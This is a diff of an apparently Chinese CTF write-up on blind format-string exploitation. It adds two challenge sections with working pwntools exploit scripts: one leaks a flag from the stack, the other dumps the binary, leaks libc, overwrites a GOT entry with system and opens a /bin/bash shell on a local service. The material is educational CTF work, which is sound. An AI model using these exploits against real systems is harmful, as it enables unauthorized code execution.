@@ -297,7 +297,7 @@ if __name__ == '__main__':
 
 这里在 `vuln` 中并没有找到 `flag` ，这个时候发现了一个 `hello` 函数
 
-![protostar_format4_1](/image/2019-03-20-linux_pwn_format/protostar_format4_1-1553014781021.png)
+![protostar_format4_2](/image/2019-03-20-linux_pwn_format/protostar_format4_2.png)
 
 到这里就很明白了，通过 `printf` 更改 `got` 表中 `exit` 所对应的值为 `hello` 函数。
 
@@ -657,6 +657,177 @@ def main():
 if __name__ == '__main__':
     main()
 ```
+
+
+
+## 0x25 blind && 格式化字符串盲打
+
+这是一道没有给出 `elf` 文件也没有给出 `libc` 的题目。
+
+### 程序分析
+
+经过简单的 `fuzz` 后得到以下流程图
+
+![blind_flow_chart](/image/2019-03-20-linux_pwn_format/blind_flow_chart.jpg)
+
+这里出题人已经很明确的告诉我们了，`flag` 在栈上，所以我们只需要将栈上的 `flag` 泄露出来即可。
+
+`poc` ：
+
+```python
+# -*- coding: utf-8 -*-
+# !/usr/bin/python env
+from pwn import *
+
+
+def leak_flag(payload):
+    exp_file = remote("127.0.0.1", 10000)
+    exp_file.sendline(payload)
+    recv_value = exp_file.recvuntil(".")
+    recv_value_str = ""
+    if recv_value[:2] == "0x":
+        recv_value_int = int(recv_value.replace(".", ""), 16)
+        recv_value_str = p64(recv_value_int)
+    exp_file.close()
+    return recv_value_str
+
+
+def main():
+    value = ""
+    for counts in range(1, 100):
+        payload = "%{nums}$p.".format(nums=counts)
+        value += leak_flag(payload)
+    print(value)
+
+
+if __name__ == '__main__':
+    main()
+```
+
+
+
+## 0x26 blind_got && 格式化字符串盲打
+
+这是一道没有给出 `elf` 文件只给出了 `libc` 的题目 。
+
+### 程序分析
+
+经过简单的 `fuzz` 后可以得到大致程序流程。
+
+![blind_got_flow_chart](/image/2019-03-20-linux_pwn_format/blind_got_flow_chart.jpg)
+
+看到这里感觉做题思路和 `brop` 很像啊，
+
+#### 格式化字符串盲打
+
+简单的理一下思路。
+
+1. 使用 `格式化字符串漏洞` 泄露出栈上的数据。（确定程序位数、确定程序是否开启 `PIE`）
+2. 使用 `格式化字符串漏洞` 泄露出整个 `ELF` 文件内容。（方便我们分析程序）
+3. 分析 `ELF` 文件（根据栈上的返回地址，得到函数的地址，分析函数得到 `got` 表 或者 `栈分布情况` 。）
+4. 使用 `格式化字符串漏洞` 修改 `GOT` 表或者修改返回地址。
+
+
+
+### 漏洞利用
+
+在刚才 `fuzz` 的过程中发现程序中存在 `0x7f**********` 和 `0x4*****` 的地址。
+
+所以很明显这是一个 `64` 位的程序，并且没有开启 `PIE` 保护。
+
+下面的操作在 `brop` 已经详细讲过了，所以不在赘述了，直接给出 `poc` 。
+
+`poc` :
+
+```python
+# -*- coding: utf-8 -*-
+# !/usr/bin/python env
+from pwn import *
+import re
+
+
+def leak_elf():
+    file_ptr = open("binary", "w+")
+    file_content = ""
+    exp_file = remote("127.0.0.1", 10000)
+    addr = 0x400000
+    for counts in range(0x1000):
+        payload = "%7$s." + "aaa" + p64(addr)
+        if "\x0a" in payload:
+            file_value = "\xff"
+            file_content += file_value
+            addr += 1
+            continue
+        try:
+            exp_file.sendline(payload)
+            file_value = exp_file.recv().split(".aaa")[0]
+            # print(file_value,)
+            if file_value == "":
+                file_value = "\x00"
+            file_content += file_value
+            addr += len(file_value)
+            print(hex(addr))
+        except Exception as e:
+            if addr >= 0x401000:
+                break
+    exp_file.close()
+    file_ptr.write(file_content)
+    file_ptr.close()
+
+
+def re_payload(got_ptr, system_addr):
+    payload_2_unformat = fmtstr_payload(10, {got_ptr: system_addr}, write_size="short")
+    payload_2_addr = payload_2_unformat[:32]
+    payload_2_unformat = payload_2_unformat[32:]
+
+    format_len = len(payload_2_unformat)
+    payload_offset = 8 - format_len % 8
+    if payload_offset:
+        position_ptr = 10 + format_len / 8 + 1
+    else:
+        position_ptr = 10 + format_len / 8
+    space_nums = re.findall("%([\d]*)c", payload_2_unformat)
+
+    payload_2_format = ""
+    for nums in range(4):
+        payload_2_format += "%{space_nums}c%{nums}$hn".format(space_nums=space_nums[nums], nums=position_ptr+nums)
+    payload_2 = "a"*32 + payload_2_format + "." * payload_offset + payload_2_addr
+    return payload_2
+
+
+def main():
+    # leak the elf contents
+    # leak_elf()
+
+    exp_file = remote("127.0.0.1", 10000)
+    libc_file = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    context.bits = 64
+
+    # leak base address of libc
+    payload_1 = "%7$s" + ".aaa" + p64(0x601020)
+    exp_file.sendline(payload_1)
+    libc_addr = u64(exp_file.recv().split(".aaa")[0][:6] + "\x00"*2) - libc_file.symbols['read']
+    system_addr = libc_addr + libc_file.symbols['system']
+    log.info("libc_addr: {addr}".format(addr=hex(libc_addr)))
+    log.info("system_addr: {addr}".format(addr=hex(system_addr)))
+
+    # Change the address of printf_got using the format
+    payload_2 = re_payload(0x601018, system_addr)
+    exp_file.sendline(payload_2)
+    exp_file.sendline("/bin/bash")
+    exp_file.interactive()
+    exp_file.close()
+
+
+if __name__ == '__main__':
+    main()
+```
+
+需要注意的是，这里我选择的是修改 `got` 表。
+
+同时由于 `fmtstr_payload`  只能将地址放在前面，但是 `64` 的程序会存在字符串截断。
+
+所以写了一个简单的函数 `re_payload` 将地址放在格式化字符后。
 
 
 
